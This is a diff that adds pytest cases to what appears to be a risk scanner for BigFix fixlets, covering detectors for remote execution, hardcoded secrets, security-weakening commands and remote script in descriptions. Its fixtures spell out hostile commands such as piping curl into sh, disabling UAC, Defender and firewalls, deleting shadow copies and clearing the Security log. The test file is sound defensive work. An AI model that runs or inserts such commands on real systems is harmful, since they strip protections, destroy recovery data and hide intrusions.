@@ -5,8 +5,9 @@ Each risk signal gets a positive case and a near-miss that must not score:
 script and session relevance in a Description (W901-W903), unhashed
 downloads (W910-W913), base64 in and out of an image context (W920, W921,
 W926), decoded payloads (W922, W925, W927), decode-and-run commands (W923),
-other encodings (W924), then the score, the bands, --fail-score, --weight,
---disable, and main()'s exit codes.
+other encodings (W924), hardcoded secrets (W930), commands that weaken
+security (W931), remote script or ActiveX in a Description (W932), then the
+score, the bands, --fail-score, --weight, --disable, and main()'s exit codes.
 """
 
 import base64
@@ -293,6 +294,122 @@ def test_decode_command(line):
 )
 def test_other_obfuscation(html):
     assert "W924" in codes(bes(description=html))
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "waithidden powershell -c Invoke-Expression $command",
+        "waithidden powershell -c iex (Get-Content x.ps1 -Raw)",
+        "wait psexec.exe -accepteula -si powershell.exe -File x.ps1",
+        'wait sh -c "curl -fsSL https://example.com/i.sh | sh"',
+    ],
+)
+def test_dynamic_or_remote_execution(line):
+    assert "W923" in codes(bes(actionscript=line))
+
+
+# --- hardcoded secrets ------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        "wait setup.exe /qn AUTHTOKEN=00000000-1111-2222-3333-444444444444",
+        "wait tool.exe --password=Hunter2Secret",
+        'wait tool.exe api_key: "abcd1234efgh"',
+    ],
+)
+def test_hardcoded_secret(line):
+    assert "W930" in codes(bes(actionscript=line))
+
+
+def test_secret_from_a_parameter_is_fine():
+    line = 'wait tool.exe --password={parameter "pw" of action}'
+    assert "W930" not in codes(bes(actionscript=line))
+
+
+@pytest.mark.parametrize("value", ["required", "empty", "impersonate", "system"])
+def test_override_password_keyword_is_not_a_secret(value):
+    body = f"override wait\nrunas=localuser\npassword={value}\nwait cmd /c echo"
+    assert "W930" not in codes(bes(actionscript=body))
+
+
+@pytest.mark.parametrize(
+    "script",
+    [
+        "TakeSecureFixletAction(a, b, 'Action1', {}, { secret: secretParams });",
+        "$PWD = Hash (([GUID]::NewGuid()).guid)",
+    ],
+)
+def test_code_reference_is_not_a_secret(script):
+    assert "W930" not in codes(bes(description=f"<script>{script}</script>"))
+
+
+def test_private_key_and_aws_key_anywhere():
+    # built from pieces so this repo's detect-private-key hook stays quiet
+    key = "-----BEGIN " + "RSA PRIVATE" + " KEY-----"
+    assert "W930" in codes(bes(description=f"<pre>{key}</pre>"))
+    aws = "AKIA" + "IOSFODNN7EXAMPLE"
+    assert "W930" in codes(bes(actionscript=f"// {aws}"))
+
+
+# --- commands that weaken security --------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "line",
+    [
+        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
+        '\\Policies\\System]" "EnableLUA"=dword:00000000',
+        "waithidden powershell -c Set-MpPreference -DisableRealtimeMonitoring $true",
+        "waithidden netsh advfirewall set allprofiles state off",
+        "wait systemctl disable firewalld.service",
+        "wait setenforce 0",
+        "waithidden cmd.exe /C vssadmin delete shadows /all /quiet",
+        "waithidden wevtutil cl Security",
+        "wait net localgroup administrators CORP\\someone /add",
+        "wait useradd builder",
+        "wait csrutil disable",
+    ],
+)
+def test_security_weakening_command(line):
+    assert "W931" in codes(bes(actionscript=line))
+
+
+def test_enabling_uac_is_fine():
+    line = (
+        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion'
+        '\\Policies\\System]" "EnableLUA"=dword:00000001'
+    )
+    assert "W931" not in codes(bes(actionscript=line))
+
+
+def test_security_weakening_inside_createfile_is_seen():
+    body = "createfile until EOF\nsystemctl stop firewalld\nEOF\nwait sh x.sh"
+    assert "W931" in codes(bes(actionscript=body))
+
+
+# --- remote script / ActiveX in a Description ------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "html",
+    [
+        '<script src="https://cdn.example.com/x.js"></script>',
+        '<iframe src="//example.com/page"></iframe>',
+        "<script>var s = new ActiveXObject('WScript.Shell');</script>",
+        "<script>var r = new XMLHttpRequest();</script>",
+        "<script>fetch('https://example.com/x');</script>",
+        "<script>var c = document.cookie;</script>",
+    ],
+)
+def test_remote_script_or_activex_in_description(html):
+    assert "W932" in codes(bes(description=html))
+
+
+def test_local_inline_script_is_not_remote():
+    assert "W932" not in codes(bes(description="<script>var a = 1;</script>"))
 
 
 # --- score, bands, options --------------------------------------------------------
